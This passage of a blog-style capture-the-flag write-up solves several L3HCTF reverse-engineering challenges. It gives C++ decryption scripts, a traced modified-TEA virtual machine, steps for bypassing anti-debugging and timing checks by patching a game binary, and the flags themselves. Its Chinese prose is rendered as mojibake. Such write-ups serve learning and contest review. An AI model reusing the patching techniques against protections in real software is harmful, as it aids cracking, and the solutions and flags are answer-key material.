class="string">&lt;math.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> cipher[<span class="number">16</span>] = &#123;</span><br><span class="line">    <span class="number">0x000000F3</span>, <span class="number">0x00000082</span>, <span class="number">0x00000006</span>, <span class="number">0x000001FD</span>, <span class="number">0x00000150</span>, <span class="number">0x00000038</span>, <span class="number">0x000000B2</span>, <span class="number">0x000000DE</span>,</span><br><span class="line">    <span class="number">0x0000015A</span>, <span class="number">0x00000197</span>, <span class="number">0x0000009C</span>, <span class="number">0x000001D7</span>, <span class="number">0x0000006E</span>, <span class="number">0x00000028</span>, <span class="number">0x00000146</span>, <span class="number">0x00000097</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> key[]&#123; <span class="number">0x000000B0</span>, <span class="number">0x000000C8</span>, <span class="number">0x000000FA</span>, <span class="number">0x00000086</span>, <span class="number">0x0000006E</span>, <span class="number">0x0000008F</span>, <span class="number">0x000000AF</span>, <span class="number">0x000000BF</span>,</span><br><span class="line">    <span class="number">0x000000C9</span>, <span class="number">0x00000064</span>, <span class="number">0x000000D7</span>, <span class="number">0x000000C3</span>, <span class="number">0x000000E3</span>, <span class="number">0x000000EF</span>, <span class="number">0x00000087</span>, &#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// æ¯”è¾ƒå¤„æ¯”è¾ƒçš„æ˜¯å¯†æ–‡å’Œcipher-20ï¼Œæ‰€ä»¥è¯¥å¤„å…¨éƒ¨-20ä¸ºç›®æ ‡å¯†æ–‡ã€‚</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        cipher[i] -= <span class="number">20</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span>* Cipher = cipher;</span><br><span class="line">    <span class="type">uint32_t</span> m[<span class="number">16</span>]&#123;&#125;;</span><br><span class="line">    m[<span class="number">0</span>] = Cipher[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> SubIndexList[]&#123; <span class="number">1</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">15</span> &#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">bool</span> IsSub = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">6</span>; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (i == SubIndexList[j])</span><br><span class="line">                IsSub = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (IsSub)</span><br><span class="line">        &#123;</span><br><span class="line">            m[i] = key[i - <span class="number">1</span>] - cipher[i];</span><br><span class="line">            m[i] ^= m[i - <span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            m[i] = cipher[i] - key[i - <span class="number">1</span>];</span><br><span class="line">            m[i] ^= m[i - <span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%x&quot;</span>, m[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// df9d4ba41258574ccb7155b9d01f5c58</span></span><br></pre></td></tr></table></figure><p>L3HCTF{df9d4ba41258574ccb7155b9d01f5c58}</p><h2 id="snake"><a href="#snake" class="headerlink" title="snake"></a>snake</h2><p>IDAè°ƒè¯•å‘ç°å­˜åœ¨åè°ƒè¯•ç›´æ¥é€€å‡ºï¼Œç›´æ¥æ–­ç‚¹runtime_main_func1å¼€å¤´ï¼Œç”¨ScyllaHideå°±å¯ä»¥è¿‡åè°ƒè¯•ã€‚</p><p>å‘ç°è¿è¡Œåè¿‡ä¸€ä¼šæŠ¥time erroré”™è¯¯é€€å‡ºï¼Œå¯èƒ½æ˜¯å­˜åœ¨å…¶ä»–åè°ƒè¯•ï¼Œè¿™è¾¹ç›´æ¥æ–­ç‚¹runtime_exitï¼Œç„¶åè¿è¡Œæ¸¸æˆé©¬ä¸ŠæŒ‰ESCæ‰‹åŠ¨é€€å‡ºï¼Œé€šè¿‡æ ˆå›æº¯å°±å¯ä»¥æ‰¾åˆ°è°ƒç”¨æ–¹ã€‚</p><p><img src="/2025/07/14/L3HCTF/image-14.png" alt="alt text"></p><p>å‘ç°æ˜¯è¿™ä¸ªå‡½æ•°è¿™è¾¹è°ƒç”¨çš„ï¼Œé‚£ä¹ˆå°±é‡ç‚¹è°ƒè¯•è¿™è¾¹ä¸Šé¢éƒ¨åˆ†çš„ä»£ç ã€‚è°ƒè¯•å‘ç°sub_50D220æ‰§è¡Œæ¸¸æˆå°±å¼€å§‹ï¼Œé‚£ä¹ˆæ¸¸æˆæ ¸å¿ƒå‡½æ•°å°±åœ¨è¿™é‡Œé¢ã€‚</p><p><img src="/2025/07/14/L3HCTF/image-15.png" alt="alt text"></p><p>ä¹‹åä¼šé‡åˆ°å¾ˆå¤šå‡½æ•°æ— æ³•åç¼–è¯‘ï¼Œè§£å†³æ–¹æ³•æ˜¯ç›´æ¥deleteå‡½æ•°ï¼Œè·³è¿‡å¼€å¤´è¿™ä¸¤è¡Œæ±‡ç¼–ï¼Œå¯¹ä¸‹é¢çš„å‰©ä½™ä»£ç æŒ‰Pè¿˜åŸæˆå‡½æ•°å³å¯ã€‚</p><p><img src="/2025/07/14/L3HCTF/image-16.png" alt="alt text"></p><p>åŠ¨è°ƒsub_50D220å†…éƒ¨ï¼Œæœ€åå‘ç°sub_509EA0è¿™è¾¹è°ƒç”¨äº†æ¸¸æˆCallï¼Œæ­¥å…¥è¿›å»ï¼Œèµ°åˆ°call rcxå†æ­¥å…¥ï¼Œå°±å¯ä»¥è·³åˆ°æ¸¸æˆéƒ¨åˆ†ï¼Œsub_50BAC0ã€‚</p><p><img src="/2025/07/14/L3HCTF/image-17.png" alt="alt text"></p><p>åœ¨æ¸¸æˆCallå¼€å¤´ä¼šå‘ç°ä¸€ä¸ªæ—¶é—´æ£€æµ‹ï¼Œæ£€æµ‹æ—¶é—´å·®æ˜¯å¦å¤§äº80msï¼Œç›´æ¥åœ¨v4åˆ¤æ–­å¤„æ–­ç‚¹èµ‹å€¼rcxä¸º0ï¼Œå°±å¯ä»¥è·³è¿‡ifé‡Œé¢çš„ä»£ç ï¼Œä¹Ÿå°±ç»•è¿‡äº†æ—¶é—´æ£€æµ‹ã€‚</p><p><img src="/2025/07/14/L3HCTF/image-18.png" alt="alt text"></p><p> <img src="/2025/07/14/L3HCTF/image-19.png" alt="alt text"></p><p>å¯ä»¥çœ‹åˆ°è¯¥å‡½æ•°é‡Œé¢æœ‰ä¸€äº›ç±»RC4çš„ä»£ç ã€‚</p><p> <img src="/2025/07/14/L3HCTF/image-20.png" alt="alt text"></p><p>é€šè¿‡åŠ¨è°ƒã€patchï¼Œå‘ç°è¯¥å¤„æ˜¯åŠ åˆ†çš„åœ°æ–¹ï¼Œåªè¦æ»¡è¶³å¤–é¢ä¸¤ä¸ªifè¿›æ¥å°±æ˜¯score+1ï¼Œç„¶åä¸‹é¢è¿›è¡Œä¸€æ¬¡ç±»RC4çš„åŠ è§£å¯†ã€‚</p><p><img src="/2025/07/14/L3HCTF/image-22.png" alt="alt text"></p><p>ç›´æ¥å°†è¿™ä¸¤å¤„çš„åˆ¤æ–­éƒ½å»æ‰ï¼Œå°±å¯ä»¥è®©ä»–è¿›å…¥åŠ åˆ†ä»£ç ã€‚</p><p><img src="/2025/07/14/L3HCTF/image-24.png" alt="alt text"></p><p>åœ¨æ­¤å¤„æ–­ç‚¹ï¼Œéšä¾¿ä¿®æ”¹ä¸ªåˆ†æ•°ï¼Œ0xAAï¼Œç„¶åè¿è¡Œä»£ç ã€‚</p><p><img src="/2025/07/14/L3HCTF/image-25.png" alt="alt text"></p><p>å‘ç°æ¸¸æˆCallè°ƒç”¨æ–¹å‡½æ•°ä¸‹é¢è¿™ä¸ªå‡½æ•°è¢«è°ƒç”¨äº†ã€‚</p><p><img src="/2025/07/14/L3HCTF/image-26.png" alt="alt text"></p><p>æ­¥å…¥å‡½æ•°ï¼Œå‘ç°è¿™è¾¹åˆ¤æ–­äº†åˆ†æ•°æ˜¯å¦&gt;&#x3D;100ï¼Œç„¶åæ‰§è¡Œé‡Œé¢çš„ä¸€äº›ç›¸å…³æ“ä½œï¼Œä¼šè¾“å‡ºä¸€äº›æ•°æ®ï¼Œä½†æ˜¯å‘ç°æ‰§è¡Œåå¹¶æ²¡æœ‰è¾“å‡ºä»€ä¹ˆåœ¨æ§åˆ¶å°ã€‚</p><p>çŒœæµ‹å¯èƒ½æ˜¯è¦æ‰‹åŠ¨ä¸€æ¬¡ä¸€æ¬¡æ‰§è¡ŒåŠ åˆ†ä»£ç åˆ°100ï¼Œå› ä¸ºåŠ åˆ†ä»£ç é‡Œé¢å­˜åœ¨ç±»RC4åŠ è§£å¯†ä»£ç ï¼Œå¯èƒ½æ˜¯éœ€è¦æ‰§è¡Œ100æ¬¡æ‰èƒ½è®©è¿™è¾¹æˆåŠŸè¾“å‡ºæ•°æ®ã€‚</p><p><img src="/2025/07/14/L3HCTF/image-27.png" alt="alt text"></p><p>è¿™è¾¹é‡‡ç”¨patchåŠ åˆ†æ¡ä»¶ä»£ç æ¥è®©ç¨‹åºè·‘çš„æ—¶å€™ä¸€ç›´è‡ªåŠ¨åŠ åˆ†ï¼Œè¿˜éœ€è¦patchæ—¶é—´æ£€æµ‹ç›¸å…³ä»£ç ï¼Œä¸ç„¶ç¨‹åºæ­£å¸¸è¿è¡Œçš„æ—¶å€™è·‘ä¸€åŠå°±ä¼šæŠ¥time erroré”™è¯¯ã€‚</p><p>ä¸€ä¸‹æˆªå›¾ä¸ºéœ€è¦nopçš„ä¸¤å¤„åœ°æ–¹ã€‚</p><p><img src="/2025/07/14/L3HCTF/image-24.png" alt="alt text"></p><p><img src="/2025/07/14/L3HCTF/image-28.png" alt="alt text"></p><p>ä¿å­˜patchåˆ°ç¨‹åºï¼Œè¿è¡Œè®©ä»–è·‘åˆ°100ï¼Œæ§åˆ¶å°å°±ä¼šè‡ªåŠ¨è¾“å‡ºFlagã€‚</p><p><img src="/2025/07/14/L3HCTF/image-29.png" alt="alt text"></p><p>L3HCTF{ad4d5916-9697-4219-af06-014959c2f4c9}</p><h2 id="ez-android"><a href="#ez-android" class="headerlink" title="ez_android"></a>ez_android</h2><p>javaå±‚å¤ªå¤šä¸œè¥¿æ‰¾ä¸åˆ°æ ¸å¿ƒï¼Œç›´æ¥çœ‹libï¼Œåœ¨greetå‡½æ•°å¯ä»¥æ‰¾åˆ°åŠ å¯†ä»£ç ä»¥åŠå¯†æ–‡æ¯”è¾ƒï¼Œç›´æ¥ç¼–å†™è§£å¯†å³å¯ã€‚</p><p><img src="/2025/07/14/L3HCTF/image-30.png" alt="alt text"></p><h3 id="è§£å¯†ä»£ç -2"><a href="#è§£å¯†ä»£ç -2" class="headerlink" title="è§£å¯†ä»£ç "></a>è§£å¯†ä»£ç </h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Decrypt</span><span class="params">(<span class="type">uint8_t</span>* Input, <span class="type">uint8_t</span>* Key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> v10&#123;&#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">27</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">v10 = i - <span class="number">14</span>;</span><br><span class="line"><span class="keyword">if</span> (i &lt; <span class="number">14</span>)</span><br><span class="line">v10 = i;</span><br><span class="line">Input[i] ^= Key[(i + <span class="number">4</span>) % <span class="number">14</span>];</span><br><span class="line">Input[i] = ((Input[i] &gt;&gt; (Key[(i + <span class="number">3</span>) % <span class="number">0xEu</span>] &amp; <span class="number">7</span>)) | (Input[i] &lt;&lt; (-Key[(i + <span class="number">3</span>) % <span class="number">0xEu</span>] &amp; <span class="number">7</span>)));</span><br><span class="line">Input[i] = (Input[i] - Key[(<span class="type">uint8_t</span>)(((<span class="number">2</span> * i) | <span class="number">1</span>) - <span class="number">14</span> * ((<span class="number">147</span> * ((<span class="type">uint8_t</span>)(<span class="number">2</span> * i) | <span class="number">1u</span>)) &gt;&gt; <span class="number">11</span>))]) ^ Key[v10];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="type">uint8_t</span> key[] = <span class="string">&quot;dGhpc2lzYWtleQ&quot;</span>;</span><br><span class="line"><span class="type">uint8_t</span> Cipher[] = &#123; <span class="number">0x0C</span>,<span class="number">0x15</span>,<span class="number">0x25</span>,<span class="number">0xA0</span>,<span class="number">0x63</span>,<span class="number">0x96</span>,<span class="number">0x40</span>,<span class="number">0x0A</span>,<span class="number">0x5C</span>,<span class="number">0x16</span>,<span class="number">0x65</span>,<span class="number">0x40</span>,<span class="number">0x29</span>,<span class="number">0x06</span>,<span class="number">0xE1</span>,<span class="number">0x1F</span>,<span class="number">0x90</span>,<span class="number">0x72</span>,<span class="number">0x2C</span>,<span class="number">0x0E</span>,<span class="number">0x4C</span>,<span class="number">0x0A</span>,<span class="number">0x02</span>,<span class="number">0xFC</span>,<span class="number">0x4f</span>,<span class="number">0x32</span>,<span class="number">0x2A</span>&#125;;</span><br><span class="line"><span class="built_in">Decrypt</span>(Cipher, key);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%.27s\n&quot;</span>, Cipher);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// L3HCTF&#123;ez_rust_reverse_lol&#125;</span></span><br></pre></td></tr></table></figure><p>L3HCTF{ez_rust_reverse_lol}</p><h2 id="easyvm"><a href="#easyvm" class="headerlink" title="easyvm"></a>easyvm</h2><p>ä¸»å‡½æ•°å¯ä»¥çœ‹åˆ°å…ˆè°ƒç”¨äº†VMï¼Œç„¶åå†è°ƒç”¨äº†ä¸€ä¸ªå¯†æ–‡æ¯”è¾ƒï¼Œå¯†æ–‡è¿™è¾¹å°±å¯ä»¥å–åˆ°ï¼Œå…±32å­—èŠ‚ã€‚</p><p><img src="/2025/07/14/L3HCTF/image-31.png" alt="alt text"></p><p><img src="/2025/07/14/L3HCTF/image-32.png" alt="alt text"></p><p>è¿™é‡Œå°±æ˜¯æ ¸å¿ƒVMä»£ç ã€‚</p><p><img src="/2025/07/14/L3HCTF/image-33.png" alt="alt text"></p><p>å¯ä»¥çœ‹åˆ°VMé‡Œé¢å­˜åœ¨å…±8ç§è¿ç®—ï¼Œæˆ‘çš„åšæ³•æ˜¯åªå…³æ³¨è¿ç®—ã€‚ç›´æ¥å³é”®åŒæ­¥åˆ°æ±‡ç¼–ç•Œé¢ï¼Œå¯¹8ä¸ªè¿ç®—çš„æ±‡ç¼–éƒ½æ–­ç‚¹ï¼Œå†™æ¡ä»¶ä»£ç ï¼Œå°†è¿ç®—çš„ä¸¤ä¸ªå€¼ä»¥åŠç»“æœéƒ½è¾“å‡ºå‡ºæ¥ã€‚</p><p><img src="/2025/07/14/L3HCTF/image-47.png" alt="alt text"></p><p><img src="/2025/07/14/L3HCTF/image-48.png" alt="alt text"></p><p><img src="/2025/07/14/L3HCTF/image-49.png" alt="alt text"></p><p><img src="/2025/07/14/L3HCTF/image-37.png" alt="alt text"></p><p><img src="/2025/07/14/L3HCTF/image-38.png" alt="alt text"></p><p><img src="/2025/07/14/L3HCTF/image-39.png" alt="alt text"></p><p><img src="/2025/07/14/L3HCTF/image-40.png" alt="alt text"></p><p><img src="/2025/07/14/L3HCTF/image-41.png" alt="alt text"></p><p><img src="/2025/07/14/L3HCTF/image-42.png" alt="alt text"></p><p>ä»¥åŠ æ³•ä¸ºä¾‹å­ï¼Œæ±‡ç¼–ç•Œé¢è¿™è¾¹ä¸¤ä¸ªåŠ æ•°æ˜¯ä»rbpé‡Œé¢å–çš„ï¼Œç„¶åè®¡ç®—ç»“æœå­˜åœ¨eaxé‡Œé¢ï¼Œæ‰€ä»¥å°±è®¾ç½®æ–­ç‚¹åœ¨addä¸‹ä¸€è¡Œï¼Œç„¶åå†™å¦‚ä¸‹ä»£ç ï¼Œè·å–ä¸¤ä¸ªåŠ æ•°ä»¥åŠè®¡ç®—ç»“æœï¼ŒæŒ‰â€%X &#x3D; %X + %X;â€æ ¼å¼åŒ–è¾“å‡ºï¼Œå…¶ä½™7ä¸ªè¿ç®—åŒæ ·è¿™æ ·åšå°±å¯ä»¥ã€‚</p><p><img src="/2025/07/14/L3HCTF/image-44.png" alt="alt text"></p><p><img src="/2025/07/14/L3HCTF/image-43.png" alt="alt text"></p><p>è¿è¡Œç¨‹åºè¾“å…¥â€11112222333344445555666677778888â€ï¼Œæ–¹ä¾¿è§‚å¯ŸåŠ å¯†è¿‡ç¨‹ã€‚å¯ä»¥å¾—åˆ°çº¦5000è¡Œè¾“å‡ºï¼Œä½†æ˜¯æˆ‘ä»¬åªéœ€è¦è§‚å¯Ÿå…¶ä¸­åå‡ äºŒåè¡Œå°±å¯ä»¥ã€‚</p><p><img src="/2025/07/14/L3HCTF/image-45.png" alt="alt text"></p><p>è¿™æ˜¯ç¬¬ä¸€è½®è¿ç®—ï¼Œæˆ‘å·²ç»æ³¨é‡Šä¸Šäº†å¯¹åº”çš„ä»£ç ï¼Œå¯ä»¥é€šè¿‡è¿ç®—æ¸…æ¥šçœ‹å‡ºæ˜¯ä¸€ä¸ªé­”æ”¹TEAä»£ç ï¼Œè€Œä¸”Keyå°±åœ¨è¿ç®—ä¸­å¯ä»¥å¾—åˆ°ã€‚</p><p><strong>Keyï¼š{ 0x0, 0xA56BABCD, 0xFFFFFFFF, 0xABCDEF01 }</strong></p><p><strong>Deltaï¼š0x11223344</strong></p><p><strong>è½®æ•°ï¼š64</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">// Key&#123; 0x0, 0xA56BABCD, 0xFFFFFFFF, 0xABCDEF01 &#125;</span><br><span class="line">// Delta 0x11223344</span><br><span class="line">// RoundsNum 0x40</span><br><span class="line">// B -= (((A &lt;&lt; 2) + key[2]) ^ (A + Sum + key[3]) ^ ((A &gt;&gt; 5) + key[1]));</span><br><span class="line">91919190 = 32323232 &lt;&lt; 3;</span><br><span class="line">36FD3D5D = 91919190 + A56BABCD;</span><br><span class="line">32323232 = 32323232 + 0;</span><br><span class="line">32323232 = 32323232 + 0;</span><br><span class="line">4CF0F6F = 32323232 ^ 36FD3D5D;</span><br><span class="line">3232323 = 32323232 &gt;&gt; 4;</span><br><span class="line">3232322 = 3232323 + FFFFFFFF;</span><br><span class="line">7EC2C4D = 4CF0F6F ^ 3232322;</span><br><span class="line">391D5D7E = 7EC2C4D + 31313131;</span><br><span class="line"></span><br><span class="line">// Sum += Delta;</span><br><span class="line">11223344 = 0 + 11223344;</span><br><span class="line"></span><br><span class="line">// A -= (((B &lt;&lt; 3) + key[1]) ^ (B + Sum + key[0]) ^ ((B &gt;&gt; 4) + key[2]));</span><br><span class="line">E47575F8 = 391D5D7E &lt;&lt; 2;</span><br><span class="line">E47575F7 = E47575F8 + FFFFFFFF;</span><br><span class="line">4A3F90C2 = 391D5D7E + 11223344;</span><br><span class="line">F60D7FC3 = 4A3F90C2 + ABCDEF01;</span><br><span class="line">12780A34 = F60D7FC3 ^ E47575F7;</span><br><span class="line">1C8EAEB = 391D5D7E &gt;&gt; 5;</span><br><span class="line">A73496B8 = 1C8EAEB + A56BABCD;</span><br><span class="line">B54C9C8C = 12780A34 ^ A73496B8;</span><br><span class="line">E77ECEBE = B54C9C8C + 32323232;</span><br><span class="line"></span><br><span class="line">// Rounds--;</span><br><span class="line">3F = 40 - 1;</span><br></pre></td></tr></table></figure><p>è¿˜åŸåŠ å¯†ä»£ç ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint32_t</span> key[]&#123; <span class="number">0x0</span>, <span class="number">0xA56BABCD</span>, <span class="number">0xFFFFFFFF</span>, <span class="number">0xABCDEF01</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> Delta = <span class="number">0x11223344</span>;</span><br><span class="line"></span><br><span class="line">DWORD Sum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">DWORD A = Input[<span class="number">0</span>];</span><br><span class="line">DWORD B = Input[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x40</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">    A += (((B &lt;&lt; <span class="number">3</span>) + key[<span class="number">1</span>]) ^ (B + Sum + key[<span class="number">0</span>]) ^ ((B &gt;&gt; <span class="number">4</span>) + key[<span class="number">2</span>]));</span><br><span class="line">    </span><br><span class="line">    Sum += Delta;</span><br><span class="line"></span><br><span class="line">    B += (((A &lt;&lt; <span class="number">2</span>) + key[<span class="number">2</span>]) ^ (A + Sum + key[<span class="number">3</span>]) ^ ((A &gt;&gt; <span class="number">5</span>) + key[<span class="number">1</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Input[<span class="number">0</span>] = A;</span><br><span class="line">Input[<span class="number">1</span>] = B;</span><br></pre></td></tr></table></figure><p>éœ€è¦æ³¨æ„ä¸€ç‚¹ï¼Œè§‚å¯Ÿè¾“å‡ºæ•°æ®å¯ä»¥å‘ç°ä¸åŒç»„åŠ å¯†ä¹‹é—´å…±ç”¨ä¸€ä¸ªSumå€¼ï¼Œä¹Ÿå°±æ˜¯ç¬¬ä¸€ç»„æ•°æ®åŠ å¯†åçš„Sumå€¼ä¼šä½œä¸ºä¸‹ä¸€ç»„æ•°æ®åŠ å¯†çš„åˆå§‹Sumå€¼ï¼Œæ‰€ä»¥è§£å¯†çš„æ—¶å€™è¦æ³¨æ„Sumå€¼ã€‚</p><h3 id="è§£å¯†ä»£ç -3"><a href="#è§£å¯†ä»£ç -3" class="headerlink" title="è§£å¯†ä»£ç "></a>è§£å¯†ä»£ç </h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Decrypt</span><span class="params">(<span class="type">uint32_t</span>* Input, <span class="type">int</span> i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">uint32_t</span> key[]&#123; <span class="number">0x0</span>, <span class="number">0xA56BABCD</span>, <span class="number">0xFFFFFFFF</span>, <span class="number">0xABCDEF01</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> Delta = <span class="number">0x11223344</span>;</span><br><span class="line"></span><br><span class="line">DWORD Sum = Delta * <span class="number">0x40</span> * i;</span><br><span class="line"></span><br><span class="line">DWORD A = Input[<span class="number">0</span>];</span><br><span class="line">DWORD B = Input[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x40</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">B -= (((A &lt;&lt; <span class="number">2</span>) + key[<span class="number">2</span>]) ^ (A + Sum + key[<span class="number">3</span>]) ^ ((A &gt;&gt; <span class="number">5</span>) + key[<span class="number">1</span>]));</span><br><span class="line"></span><br><span class="line">Sum -= Delta;</span><br><span class="line"></span><br><span class="line">A -= (((B &lt;&lt; <span class="number">3</span>) + key[<span class="number">1</span>]) ^ (B + Sum + key[<span class="number">0</span>]) ^ ((B &gt;&gt; <span class="number">4</span>) + key[<span class="number">2</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Input[<span class="number">0</span>] = A;</span><br><span class="line">Input[<span class="number">1</span>] = B;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">DWORD v8[<span class="number">8</span>]&#123;&#125;;</span><br><span class="line"></span><br><span class="line">v8[<span class="number">0</span>] = <span class="number">0x877A62A6</span>;</span><br><span class="line">v8[<span class="number">1</span>] = <span class="number">0x6A55F1F3</span>;</span><br><span class="line">v8[<span class="number">2</span>] = <span class="number">0xAE194847</span>;</span><br><span class="line">v8[<span class="number">3</span>] = <span class="number">0xB1E643E7</span>;</span><br><span class="line">v8[<span class="number">4</span>] = <span class="number">0xA94FE881</span>;</span><br><span class="line">v8[<span class="number">5</span>] = <span class="number">0x9BC8A28A</span>;</span><br><span class="line">v8[<span class="number">6</span>] = <span class="number">0xC4CFAA9F</span>;</span><br><span class="line">v8[<span class="number">7</span>] = <span class="number">0xF1A00CA1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i+=<span class="number">8</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">Decrypt</span>((<span class="type">uint32_t</span>*)((<span class="type">uint8_t</span>*)v8 + i), (i + <span class="number">8</span>) / <span 